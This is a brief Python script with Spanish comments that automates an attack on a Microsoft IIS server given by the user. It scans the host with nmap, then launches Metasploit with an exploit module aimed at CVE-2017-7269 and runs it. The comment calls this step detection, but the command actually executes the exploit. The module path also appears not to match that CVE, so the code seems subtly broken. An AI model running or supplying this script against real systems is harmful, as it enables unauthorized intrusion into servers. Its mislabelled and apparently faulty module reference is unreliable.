import subprocess

# Pedir la IP o el dominio del servidor IIS
target = input("Ingrese la IP o el dominio del servidor IIS: ")

# Ejecutar nmap para identificar los puertos abiertos en el servidor
subprocess.call(["nmap", "-sS", "-sV", "-O", target])

# Ejecutar el script de Metasploit para detectar la vulnerabilidad CVE-2017-7269
subprocess.call(["msfconsole", "-x", "use exploit/windows/iis/iis_new; set RHOSTS {}; run".format(target)])
